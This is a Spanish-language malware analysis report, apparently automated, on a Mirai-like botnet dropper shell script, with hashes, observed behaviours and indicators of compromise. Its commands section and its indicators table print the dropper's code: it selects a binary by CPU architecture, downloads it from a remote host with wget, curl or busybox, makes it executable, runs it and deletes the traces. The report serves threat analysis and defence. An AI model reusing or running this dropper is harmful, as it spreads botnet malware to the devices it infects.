# 🧬 Payload Analysis

`37a369285464f8de9c6c0f415202a1a2db7dc526614fb961420b48d10979a242`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Reconocimiento del sistema, Descarga remota, Cambio de permisos, Limpieza. Se identificaron 17 comandos observados o extraídos. Se identificaron 11 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:10:53.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `37a369285464f8de9c6c0f415202a1a2db7dc526614fb961420b48d10979a242`
- **MD5:** `39d972ced93be9a89b1536013b7e1ce8`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | #!/bin/sh |
| MIME | text/x-script |
| Tamaño | 866 B |
| Entropía | 5.17 |
| Strings | 28 |

## 🧠 Comportamiento observado

1. **Reconocimiento del sistema**
2. **Descarga remota**
3. **Cambio de permisos**
4. **Limpieza**
5. **Comunicación remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=text/x-script; iocs=10

## 🖥️ Comandos observados / extraídos

```text
# Dropper - detects arch, downloads correct binary, executes
mips)       BIN="bot.mips" ;;
mipsel)     BIN="bot.mipsel" ;;
aarch64)    BIN="bot.arm64" ;;
armv7l)     BIN="bot.arm" ;;
armv6l)     BIN="bot.arm" ;;
arm*)       BIN="bot.arm" ;;
x86_64)     BIN="bot.x86_64" ;;
i686)       BIN="bot.x86_64" ;;
*)          BIN="bot.mips" ;;
# Try wget, curl, busybox wget
wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null || \
curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null || \
busybox wget -q -O /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null
chmod 777 /tmp/.d
/tmp/.d </dev/null >/dev/null 2>&1 &
rm -f /tmp/.d $0
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://$S:$P/$BIN | strings |
| ip | 80.96.112.XXX | static_analysis |
| command | # Try wget, curl, busybox wget | strings |
| command | wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null \|\| \ | strings |
| command | curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null \|\| \ | strings |
| command | busybox wget -q -O /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null | strings |
| command | chmod 777 /tmp/.d | strings |
| command | /tmp/.d </dev/null >/dev/null 2>&1 & | strings |
| command | rm -f /tmp/.d $0 | strings |
| hash | 37a369285464f8de9c6c0f415202a1a2db7dc526614fb961420b48d10979a242 | static_analysis |
| url | hxxp://80[.]96[.]112[.]XXX:8080/bot[.]sh | source_url |
| domain | 80[.]96[.]112[.]XXX |  |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
